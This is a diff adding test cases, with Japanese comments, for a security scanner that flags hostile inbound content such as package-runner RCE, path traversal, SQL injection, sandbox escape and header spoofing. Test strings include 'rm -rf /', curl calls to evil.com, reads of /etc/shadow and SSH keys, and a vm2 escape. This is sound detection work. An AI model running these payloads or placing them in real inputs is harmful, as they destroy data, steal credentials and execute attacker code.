@@ -688,6 +688,345 @@ console.log('\n=== Stats ===');
   fs.rmSync(tmpDir, { recursive: true });
 }
 
+// === T-1: IN-002 拡張 (npx/npm exec/pnpm/yarn/bun/deno + NODE_OPTIONS) ===
+console.log('\n=== T-1: IN-002 Extension (package runner RCE) ===');
+
+const allInboundV14 = {
+  promptInjection: true, shellCommands: true, suspiciousUrls: true,
+  scriptInjection: true, toolTampering: true, asciiSmuggling: true,
+  base64Payload: true, responseSizeLimit: true, hiddenFields: true,
+  elicitationAbuse: true, samplingInjection: true, logToLeak: true,
+  conversationMarker: true, credentialsInResponse: true,
+  parameterOverride: true, pathTraversal: true, queryInjectionBlock: true,
+  queryInjectionWarn: true, sandboxEscape: true, headerSpoofing: true,
+  browserLaunchRCE: true,
+};
+
+// T-1-a: npx -c
+{
+  const r = runInboundChecks('npx -c "touch /tmp/pwn"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-a: npx -c detected');
+}
+// T-1-b: npx --call
+{
+  const r = runInboundChecks('npx --call "rm -rf /"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-b: npx --call detected');
+}
+// T-1-c: npm exec -c
+{
+  const r = runInboundChecks('npm exec -c "malicious"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-c: npm exec -c detected');
+}
+// T-1-c2: npm exec -- (FIX A-1: -- セパレータ形式)
+{
+  const r = runInboundChecks('npm exec -- malicious-pkg', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-c2: npm exec -- (separator) detected (FIX A-1)');
+}
+// T-1-d: pnpm exec -c
+{
+  const r = runInboundChecks('pnpm exec -c "malicious"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-d: pnpm exec -c detected');
+}
+// T-1-e: pnpm dlx -c
+{
+  const r = runInboundChecks('pnpm dlx -c "malicious"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-e: pnpm dlx -c detected');
+}
+// T-1-f: yarn dlx -c
+{
+  const r = runInboundChecks('yarn dlx -c "malicious"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-f: yarn dlx -c detected');
+}
+// T-1-g: bun -e
+{
+  const r = runInboundChecks("bun -e \"Bun.spawn(['curl', 'http://evil.com'])\"", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-g: bun -e detected');
+}
+// T-1-h: bun x -c
+{
+  const r = runInboundChecks('bun x -c "malicious"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-h: bun x -c detected');
+}
+// T-1-i: deno eval
+{
+  const r = runInboundChecks('deno eval "Deno.exit()"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-i: deno eval detected');
+}
+// T-1-j: deno -e
+{
+  const r = runInboundChecks('deno -e "malicious"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-j: deno -e detected');
+}
+// T-1-k: deno -p
+{
+  const r = runInboundChecks('deno -p "1+1"', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-k: deno -p detected');
+}
+// T-1-NODE-1: NODE_OPTIONS=--require
+{
+  const r = runInboundChecks('NODE_OPTIONS=--require ./malicious.js', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-NODE-1: NODE_OPTIONS=--require detected');
+}
+// T-1-NODE-2: NODE_OPTIONS=--experimental-loader= (FIX A-2: = 区切り)
+{
+  const r = runInboundChecks('NODE_OPTIONS=--experimental-loader=data:text/javascript,console.log()', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-NODE-2: NODE_OPTIONS=--experimental-loader= detected (FIX A-2)');
+}
+// T-1-NODE-3: NODE_OPTIONS="--experimental-loader data:..." (空白区切り)
+{
+  const r = runInboundChecks('NODE_OPTIONS="--experimental-loader data:text/javascript,..."', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-002'), 'T-1-NODE-3: NODE_OPTIONS --experimental-loader (space) detected');
+}
+// T-1-N1: npx create-react-app (正常npx, NO_DETECT)
+{
+  const r = runInboundChecks('npx create-react-app my-app', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-002');
+  assert(findings.length === 0, 'T-1-N1: npx create-react-app passes (no false positive)');
+}
+// T-1-N2: npm install (正常, NO_DETECT)
+{
+  const r = runInboundChecks('npm install lodash', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-002');
+  assert(findings.length === 0, 'T-1-N2: npm install passes (no false positive)');
+}
+// T-1-N3: yarn add (正常, NO_DETECT)
+{
+  const r = runInboundChecks('yarn add lodash', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-002');
+  assert(findings.length === 0, 'T-1-N3: yarn add passes (no false positive)');
+}
+
+// === T-2: 新規 IN-015〜021 各ルール ===
+console.log('\n=== T-2: New Rules IN-015, 017, 018, 019, 020, 021 ===');
+
+// IN-015: Parameter Override
+{
+  const r = runInboundChecks('{"overrideConfig": {"mcpServerConfig": {"command": "npx", "args": ["-c", "id"]}}}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-015'), 'T-2-15a: overrideConfig + mcpServerConfig detected (IN-015)');
+}
+{
+  const r = runInboundChecks('{"overrideConfig": {"NODE_OPTIONS": "--experimental-loader=data:text/javascript,"}}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-015'), 'T-2-15b: overrideConfig + NODE_OPTIONS detected (IN-015)');
+}
+{
+  const r = runInboundChecks('{"overrideConfig": {"executablePath": "/bin/sh"}}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-015'), 'T-2-15c: overrideConfig + executablePath detected (IN-015)');
+}
+{
+  const r = runInboundChecks('{"FILE-STORAGE::*/": "comment injection bypass"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-015'), 'T-2-15d: FILE-STORAGE comment injection detected (IN-015)');
+}
+{
+  const r = runInboundChecks('{"overrideConfig": {"sessionId": "abc-123"}}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-015');
+  assert(findings.length === 0, 'T-2-15-N1: overrideConfig with sessionId only passes (no false positive)');
+}
+{
+  const r = runInboundChecks('{"overrideConfig": {"temperature": 0.7}}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-015');
+  assert(findings.length === 0, 'T-2-15-N2: overrideConfig with LLM params only passes (no false positive)');
+}
+
+// IN-017: Path Traversal
+{
+  const r = runInboundChecks('../../etc/passwd', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-017'), 'T-2-17a: ../../etc/passwd detected (IN-017)');
+}
+{
+  const r = runInboundChecks('..\\..\\windows\\system32\\config\\sam', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-017'), 'T-2-17b: Windows path traversal detected (IN-017)');
+}
+{
+  const r = runInboundChecks('{"basePath": "/etc/shadow"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-017'), 'T-2-17c: basePath=/etc/shadow detected (IN-017)');
+}
+{
+  const r = runInboundChecks('{"filePath": "/root/.ssh/id_rsa"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-017'), 'T-2-17d: filePath=/root/.ssh detected (IN-017)');
+}
+{
+  const r = runInboundChecks('{"filename": "C:\\\\Windows\\\\System32\\\\config\\\\SAM"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-017'), 'T-2-17e: filename=Windows System32 detected (IN-017)');
+}
+{
+  const r = runInboundChecks('{"filepath": "/proc/self/environ"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-017'), 'T-2-17f: filepath=/proc detected (IN-017)');
+}
+{
+  const r = runInboundChecks('./relative/path/file.txt', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-017');
+  assert(findings.length === 0, 'T-2-17-N1: relative path without traversal passes (no false positive)');
+}
+{
+  const r = runInboundChecks('node_modules/../package.json', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-017');
+  assert(findings.length === 0, 'T-2-17-N2: node_modules/../ passes (no false positive for legitimate relative path)');
+}
+{
+  const r = runInboundChecks('{"basePath": "./uploads/user-123"}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-017');
+  assert(findings.length === 0, 'T-2-17-N3: basePath=./uploads passes (no false positive)');
+}
+
+// IN-018: Query Injection BLOCK
+{
+  const r = runInboundChecks('MATCH (n) DETACH DELETE n', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018'), 'T-2-18a: MATCH DETACH DELETE detected BLOCK (IN-018)');
+}
+{
+  const r = runInboundChecks('DROP TABLE users', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018'), 'T-2-18b: DROP TABLE detected BLOCK (IN-018)');
+}
+{
+  const r = runInboundChecks('SELECT * FROM users UNION SELECT password FROM admins', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018'), 'T-2-18c: UNION SELECT detected BLOCK (IN-018)');
+}
+{
+  const r = runInboundChecks("'; --", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018'), "T-2-18d: '; -- SQL comment injection detected BLOCK (IN-018)");
+}
+// IN-018W: Query Injection WARN
+{
+  const r = runInboundChecks("' OR '1'='1", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018W'), "T-2-18e: ' OR '1'='1 detected WARN (IN-018W)");
+}
+{
+  const r = runInboundChecks("' AND 1=1 --", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018W'), "T-2-18f: ' AND 1=1 detected WARN (IN-018W)");
+}
+{
+  const r = runInboundChecks('SELECT sleep(10)', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-018W'), 'T-2-18g: sleep() time-based injection detected WARN (IN-018W)');
+}
+{
+  const r = runInboundChecks('Drop the ball during the meeting', allInboundV14);
+  const blockFindings = r.filter((f) => f.id === 'IN-018');
+  assert(blockFindings.length === 0, 'T-2-18-N1: natural language "drop" passes BLOCK check (no false positive)');
+}
+{
+  const r = runInboundChecks('Order by date asc', allInboundV14);
+  const blockFindings = r.filter((f) => f.id === 'IN-018');
+  assert(blockFindings.length === 0, 'T-2-18-N3: natural "order by" without SELECT passes (no false positive)');
+}
+
+// IN-019: Sandbox Escape
+{
+  const r = runInboundChecks("globalThis.process.mainModule.require('child_process')", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-019'), 'T-2-19a: globalThis.process.mainModule.require detected (IN-019)');
+}
+{
+  const r = runInboundChecks("process.binding('fs')", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-019'), "T-2-19b: process.binding() detected (IN-019)");
+}
+{
+  const r = runInboundChecks("({}).constructor.constructor('return process')()", allInboundV14);
+  assert(r.some((f) => f.id === 'IN-019'), 'T-2-19c: constructor.constructor() vm2 escape detected (IN-019)');
+}
+{
+  const r = runInboundChecks('__proto__.constructor.constructor', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-019'), 'T-2-19d: __proto__.constructor detected (IN-019)');
+}
+{
+  const r = runInboundChecks("process.env.NODE_ENV", allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-019');
+  assert(findings.length === 0, 'T-2-19-N1: process.env.NODE_ENV passes (no false positive)');
+}
+
+// IN-020: Header Spoofing
+{
+  const r = runInboundChecks('x-request-from: internal', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-020'), 'T-2-20a: x-request-from: internal detected WARN (IN-020)');
+}
+{
+  const r = runInboundChecks('x-forwarded-for: 127.0.0.1', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-020'), 'T-2-20b: x-forwarded-for: 127.0.0.1 detected WARN (IN-020)');
+}
+{
+  const r = runInboundChecks('X-Real-IP: localhost', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-020'), 'T-2-20c: X-Real-IP: localhost detected WARN (case-insensitive) (IN-020)');
+}
+{
+  const r = runInboundChecks('x-forwarded-for: 203.0.113.42', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-020');
+  assert(findings.length === 0, 'T-2-20-N1: x-forwarded-for public IP passes (no false positive)');
+}
+
+// IN-021: Browser Launch RCE
+{
+  const r = runInboundChecks('{"executablePath": "/bin/sh"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-021'), 'T-2-21a: executablePath=/bin/sh detected (IN-021)');
+}
+{
+  const r = runInboundChecks('{"executablePath": "/bin/bash"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-021'), 'T-2-21b: executablePath=/bin/bash detected (IN-021)');
+}
+{
+  const r = runInboundChecks('{"executablePath": "/usr/bin/nc"}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-021'), 'T-2-21c: executablePath=/usr/bin/nc detected (IN-021)');
+}
+{
+  const r = runInboundChecks('{"ignoreDefaultArgs": true, "args": ["-c", "curl http://evil.com"]}', allInboundV14);
+  assert(r.some((f) => f.id === 'IN-021'), 'T-2-21d: ignoreDefaultArgs+shell args detected (IN-021)');
+}
+{
+  const r = runInboundChecks('{"executablePath": "/usr/bin/google-chrome"}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-021');
+  assert(findings.length === 0, 'T-2-21-N1: executablePath=google-chrome passes (no false positive)');
+}
+{
+  const r = runInboundChecks('{"executablePath": "C:/Program Files/Chromium/chrome.exe"}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-021');
+  assert(findings.length === 0, 'T-2-21-N2: executablePath=Chromium on Windows passes (no false positive)');
+}
+
+// === T-5: 偽陽性（強化版） ===
+console.log('\n=== T-5: False Positive Reduction (enhanced) ===');
+{
+  const r = runInboundChecks('npm install', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-002');
+  assert(findings.length === 0, 'T-5-a: npm install passes (no false positive)');
+}
+{
+  const r = runInboundChecks('yarn add lodash', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-002');
+  assert(findings.length === 0, 'T-5-b: yarn add passes (no false positive)');
+}
+{
+  const r = runInboundChecks('python3 main.py', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-002');
+  assert(findings.length === 0, 'T-5-c: python3 main.py passes (no false positive)');
+}
+{
+  const r = runInboundChecks('{"overrideConfig": {"sessionId": "abc-123", "temperature": 0.7}}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-015');
+  assert(findings.length === 0, 'T-5-d: overrideConfig with safe params passes (no false positive)');
+}
+{
+  const r = runInboundChecks('node_modules/lodash/../package.json', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-017');
+  assert(findings.length === 0, 'T-5-e: node_modules/../ passes (no false positive for path traversal)');
+}
+{
+  const r = runInboundChecks('Drop the ball / OR / AND in natural prose', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-018');
+  assert(findings.length === 0, 'T-5-f: natural language with drop/or/and passes BLOCK check (no false positive)');
+}
+{
+  const r = runInboundChecks("process.env.NODE_ENV === 'production'", allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-019');
+  assert(findings.length === 0, 'T-5-g: process.env.NODE_ENV passes (no false positive for sandbox escape)');
+}
+{
+  const r = runInboundChecks('x-forwarded-for: 198.51.100.42', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-020');
+  assert(findings.length === 0, 'T-5-h: x-forwarded-for with public IP passes (no false positive)');
+}
+{
+  const r = runInboundChecks('{"executablePath": "/usr/bin/google-chrome-stable"}', allInboundV14);
+  const findings = r.filter((f) => f.id === 'IN-021');
+  assert(findings.length === 0, 'T-5-i: executablePath=google-chrome-stable passes (no false positive)');
+}
+
 // === Summary ===
 console.log(`\n=== Results: ${passed} passed, ${failed} failed ===`);
 process.exit(failed > 0 ? 1 : 0);
